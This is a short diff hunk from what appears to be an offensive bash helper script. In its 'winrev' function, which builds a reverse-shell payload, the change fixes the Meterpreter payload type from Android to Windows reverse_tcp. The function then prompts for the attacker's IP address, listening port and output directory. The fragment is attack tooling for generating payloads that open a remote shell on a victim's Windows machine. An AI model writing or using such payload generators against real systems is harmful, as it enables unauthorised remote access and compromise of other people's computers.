@@ -52,7 +52,7 @@ function nmapscan() {
 
 #Function reverse shell with meterpreter for Windows
 function winrev() {
-	PAYLOAD="android/meterpreter/reverse_tcp"
+	PAYLOAD="windows/meterpreter/reverse_tcp"
 	read -p $'\e[1;92mInput your ip: \e[0m' HOST
 	read -p $'\e[1;92mInput your port for forward: \e[0m' PORT
 	read -p $'\e[1;92mInput the directory to save payload: \e[0m'	DIR
